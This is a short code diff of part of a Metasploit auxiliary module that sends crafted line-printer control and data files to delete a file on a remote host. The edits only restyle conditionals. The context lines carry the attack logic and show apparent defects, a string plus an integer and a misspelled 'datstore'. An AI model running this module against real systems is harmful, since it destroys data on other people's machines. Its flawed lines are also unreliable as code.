@@ -81,10 +81,10 @@ class Metasploit3 < Msf::Auxiliary
 		dataf = Rex::Text.rand_text_alpha(100)+1
 		
 		print_status("Deleting #{datstore['RPATH']}...")
-		if (not (
+		if !(
 			send_file(sock1, 2, "cfA" + jid + r_hostname, control) and
 			send_file(sock1, 3, "dfa" + jid + r_hostname, dataf)
-		   )    )
+		   )
 		   	sock1.close
 			return
 		end
@@ -97,7 +97,7 @@ class Metasploit3 < Msf::Auxiliary
 		
 		s.put(type.chr + data.length.to_s + " " + name + "\n")
 		res = s.get_once(1)
-		if (not (res and res[0] == 0))
+		if !(res and res[0] == ?\0)
 			print_status("The target did not accept our control file command (#{name})")
 			return
 		end
@@ -105,7 +105,7 @@ class Metasploit3 < Msf::Auxiliary
 		s.put(data)
 		s.put("\x00")
 		res = s.get_once(1)
-		if (not (res and res[0] == 0))
+		if !(res and res[0] == ?\0)
 			print_status("The target did not accept our control file data (#{name})")
 			return
 		end	
